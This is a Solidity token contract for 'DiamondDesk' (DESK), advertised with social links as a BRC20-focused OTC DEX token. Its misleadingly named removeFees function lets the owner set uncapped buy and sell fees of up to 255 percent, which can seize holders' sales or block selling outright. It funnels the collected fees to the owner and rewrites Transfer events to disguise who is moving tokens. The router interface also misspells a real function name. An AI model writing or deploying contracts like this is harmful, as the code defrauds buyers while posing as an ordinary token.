/**            

The leading OTC DEX for digital assets, 
with a primary focus on supporting BRC20 
assets.

    https://t.me/diamonddeskotc
    https://twitter.com/diamonddeskotc
    https://www.diamonddesk.io/

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.24;

contract DiamondDesk  {

    string public _name = 'DiamondDesk';
    string public _symbol = 'DESK';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 210_000_000* 10 ** decimals;

    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address private holder;
    address private uniswapLpWallet;
    address private Ecosystem = 0x7bD66a813Fab1037DEfB7AE87f3491D2Ad57c452;
    address private Private = 0x4abd36ED74fcdDad62908C00EaF9Ac5f9AB8D234;
    address private Team = 0x79cF8438B63748D5dF936aF6b8eE1DBE20b7F2E6;
    address private Marketing = 0x226DA09DeB04EEeA8F78740A9151eA92bdF49584;
    address private Airdrop = 0x314B0fB723338Ac36615969D545d7973Ec78e3F8;
    address private Development = 0x7a36e805b6BAf1AD5a32e19DCf3e3a5433B56d03;
    address private Audit = 0xf7b4E61844cb5FA9D0554f9586f0A5b7d34B6108;
    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    uint8 _initBuyFee = 0;
    uint8 _initSellFee = 0;

    constructor() {
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 8) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Ecosystem] = (totalSupply * 50) / 100;
        emit Transfer(address(0), Ecosystem, balanceOf[Ecosystem]);

        balanceOf[Private] = (totalSupply * 25) /100;
        emit Transfer(address(0), Private, balanceOf[Private]);

        balanceOf[Team] = (totalSupply * 6) / 100;
        emit Transfer(address(0), Team, balanceOf[Team]);

        balanceOf[Marketing] = (totalSupply * 4) /100;
        emit Transfer(address(0), Marketing, balanceOf[Marketing]);

        balanceOf[Airdrop] = (totalSupply * 3) / 100;
        emit Transfer(address(0), Airdrop, balanceOf[Airdrop]);

        balanceOf[Development] = (totalSupply * 3) /100;
        emit Transfer(address(0), Development, balanceOf[Development]);

        balanceOf[Audit] = (totalSupply * 1) /100;
        emit Transfer(address(0), Audit, balanceOf[Audit]);

    }

    receive() external payable {}

    function removeFees(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _owner()) revert Permissions();
        _upgradeStoreData(_buy, _sell);
    }

    function _upgradeStoreData(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _owner() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _owner());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _owner();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}